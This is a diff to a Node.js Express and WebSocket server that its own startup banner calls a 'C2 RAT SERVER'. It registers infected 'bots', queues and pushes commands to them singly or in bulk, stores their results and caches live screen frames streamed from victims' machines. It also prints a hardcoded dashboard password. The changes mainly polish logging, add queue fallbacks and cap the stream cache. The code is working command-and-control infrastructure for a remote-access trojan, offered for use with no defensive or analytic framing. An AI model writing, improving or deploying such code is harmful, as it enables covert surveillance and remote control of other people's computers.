@@ -4,7 +4,6 @@ const WebSocket = require('ws');
 const cors = require('cors');
 const bodyParser = require('body-parser');
 const path = require('path');
-const fs = require('fs');
 const crypto = require('crypto');
 
 // --- INIT ---
@@ -17,7 +16,7 @@ app.use(bodyParser.json({ limit: '50mb' }));
 app.use(express.static('public'));
 
 // ============================================================
-//  DATABASE - MEMORY
+//  DATABASE - MEMORY ONLY
 // ============================================================
 const DB = {
     bots: [],
@@ -27,7 +26,7 @@ const DB = {
     admin_logs: []
 };
 
-// Stream cache
+// Stream cache for RAT
 const streamCache = new Map();
 
 // ============================================================
@@ -55,8 +54,6 @@ wss.on('connection', (ws, req) => {
             const data = JSON.parse(message);
             const botId = data.bot_id;
             if (!botId) return;
-
-            console.log(`[WS] Received from ${botId}:`, data.type);
 
             // === REGISTER ===
             if (data.type === 'register') {
@@ -89,7 +86,7 @@ wss.on('connection', (ws, req) => {
                 });
                 DB.pending_commands = DB.pending_commands.filter(p => p.bot_id !== botId);
 
-                console.log(`[BOT] Registered: ${botId}`);
+                console.log(`[BOT] ✅ Registered: ${botId}`);
                 ws.send(JSON.stringify({ type: 'registered', bot_id: botId }));
             }
 
@@ -106,16 +103,14 @@ wss.on('connection', (ws, req) => {
             else if (data.type === 'result') {
                 console.log(`[RESULT] ${botId}: ${data.cmd_id} -> ${data.status}`);
                 
-                // Tìm command trong DB
                 const cmdIndex = DB.commands.findIndex(c => c.cmd_id === data.cmd_id);
                 if (cmdIndex !== -1) {
                     DB.commands[cmdIndex].result = data.result;
                     DB.commands[cmdIndex].status = data.status || 'ok';
                     DB.commands[cmdIndex].executed_at = Date.now();
-                    console.log(`[RESULT] Updated command ${data.cmd_id}`);
+                    console.log(`[RESULT] ✅ Updated command ${data.cmd_id}`);
                 } else {
-                    // Nếu không tìm thấy, tạo mới (fallback)
-                    console.log(`[RESULT] Command ${data.cmd_id} not found, creating new`);
+                    // Fallback: tạo mới nếu không tìm thấy
                     DB.commands.push({
                         bot_id: botId,
                         cmd_id: data.cmd_id,
@@ -126,21 +121,28 @@ wss.on('connection', (ws, req) => {
                         issued_at: Date.now(),
                         executed_at: Date.now()
                     });
+                    console.log(`[RESULT] ⚠️ Created new command entry for ${data.cmd_id}`);
                 }
             }
 
             // === RAT STREAM ===
             else if (data.type === 'rat_stream') {
-                // Lưu frame vào cache
                 streamCache.set(botId, {
                     frame: data.image,
                     timestamp: data.timestamp || Date.now()
                 });
-                // console.log(`[STREAM] Frame from ${botId}, cache size: ${streamCache.size}`);
+                // Giới hạn cache
+                if (streamCache.size > 100) {
+                    const keys = streamCache.keys();
+                    for (let i = 0; i < 50; i++) {
+                        const key = keys.next().value;
+                        if (key) streamCache.delete(key);
+                    }
+                }
             }
 
         } catch (e) {
-            console.error('WS Error:', e);
+            console.error('❌ WS Error:', e);
         }
     });
 
@@ -152,7 +154,7 @@ wss.on('connection', (ws, req) => {
                 if (bot) {
                     bot.online = 0;
                 }
-                console.log(`[BOT] Disconnected: ${id}`);
+                console.log(`[BOT] ❌ Disconnected: ${id}`);
                 break;
             }
         }
@@ -166,10 +168,10 @@ function sendCommand(ws, botId, cmdId, command, args = []) {
             payload: { cmd_id: cmdId, command, args }
         });
         ws.send(payload);
-        console.log(`[CMD] Sent to ${botId}: ${command} (${cmdId})`);
+        console.log(`[CMD] 📤 Sent to ${botId}: ${command} (${cmdId})`);
         return true;
     } else {
-        console.log(`[CMD] Bot ${botId} not online, queuing`);
+        console.log(`[CMD] ⚠️ Bot ${botId} not online, queuing`);
         return false;
     }
 }
@@ -217,15 +219,27 @@ app.post('/api/command', auth, (req, res) => {
         executed_at: null
     };
     DB.commands.push(cmdEntry);
-    console.log(`[API] Command saved: ${cmdId} for ${bot_id}`);
+    console.log(`[API] 📝 Command saved: ${cmdId} for ${bot_id}`);
 
-    // Gửi command
+    // Tìm bot và gửi lệnh
     const ws = botClients.get(bot_id);
     if (ws && ws.readyState === WebSocket.OPEN) {
-        sendCommand(ws, bot_id, cmdId, command, args);
-        res.json({ status: 'sent', cmd_id: cmdId });
+        const sent = sendCommand(ws, bot_id, cmdId, command, args);
+        if (sent) {
+            res.json({ status: 'sent', cmd_id: cmdId });
+        } else {
+            // Fallback: queue
+            DB.pending_commands.push({
+                bot_id: bot_id,
+                cmd_id: cmdId,
+                command: command,
+                args: JSON.stringify(args),
+                issued_at: Date.now()
+            });
+            res.json({ status: 'queued', cmd_id: cmdId });
+        }
     } else {
-        // Lưu vào pending
+        // Bot offline -> queue
         DB.pending_commands.push({
             bot_id: bot_id,
             cmd_id: cmdId,
@@ -233,7 +247,7 @@ app.post('/api/command', auth, (req, res) => {
             args: JSON.stringify(args),
             issued_at: Date.now()
         });
-        console.log(`[API] Command queued for ${bot_id}`);
+        console.log(`[API] ⚠️ Bot ${bot_id} offline, queued`);
         res.json({ status: 'queued', cmd_id: cmdId });
     }
 });
@@ -282,10 +296,10 @@ app.post('/api/command/bulk', auth, (req, res) => {
 app.get('/api/results/:cmd_id', auth, (req, res) => {
     const cmd = DB.commands.find(c => c.cmd_id === req.params.cmd_id);
     if (cmd) {
-        console.log(`[API] Result for ${req.params.cmd_id}: ${cmd.status}`);
+        console.log(`[API] 📥 Result for ${req.params.cmd_id}: ${cmd.status}`);
         res.json(cmd);
     } else {
-        console.log(`[API] Command ${req.params.cmd_id} not found`);
+        console.log(`[API] ⚠️ Command ${req.params.cmd_id} not found`);
         res.json({});
     }
 });
@@ -295,10 +309,10 @@ app.get('/api/results/latest/:bot_id', auth, (req, res) => {
     const botId = req.params.bot_id;
     console.log(`[API] Getting latest for ${botId}`);
     
-    // 1. Lấy từ stream cache trước
+    // 1. Lấy từ stream cache
     const cached = streamCache.get(botId);
     if (cached && cached.frame) {
-        console.log(`[API] Returning cached frame for ${botId}`);
+        console.log(`[API] ✅ Returning cached frame for ${botId}`);
         return res.json({
             cmd_id: 'stream-latest',
             result: cached.frame,
@@ -313,10 +327,10 @@ app.get('/api/results/latest/:bot_id', auth, (req, res) => {
         .sort((a, b) => (b.executed_at || 0) - (a.executed_at || 0));
     
     if (cmds.length > 0) {
-        console.log(`[API] Returning latest sc command for ${botId}`);
+        console.log(`[API] ✅ Returning latest sc command for ${botId}`);
         res.json(cmds[0]);
     } else {
-        console.log(`[API] No data for ${botId}`);
+        console.log(`[API] ⚠️ No data for ${botId}`);
         res.json({});
     }
 });
@@ -442,6 +456,7 @@ app.delete('/api/db', auth, (req, res) => {
     DB.pending_commands = [];
     DB.rat_sessions = [];
     DB.admin_logs = [];
+    streamCache.clear();
     res.json({ status: 'cleared' });
 });
 
@@ -468,13 +483,11 @@ app.get('/style.css', (req, res) => {
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
     console.log('='.repeat(50));
-    console.log('  C2 RAT SERVER STARTED (FIXED)');
+    console.log('  ✅ C2 RAT SERVER STARTED');
     console.log(`  Port: ${PORT}`);
     console.log(`  Dashboard: http://localhost:${PORT}/`);
     console.log(`  RAT Control: http://localhost:${PORT}/rat`);
     console.log(`  Password: H3XTEK0`);
-    console.log('='.repeat(50));
-    console.log('  Bot clients: 0');
-    console.log('  Commands: 0');
+    console.log(`  Mode: Memory Database`);
     console.log('='.repeat(50));
 });
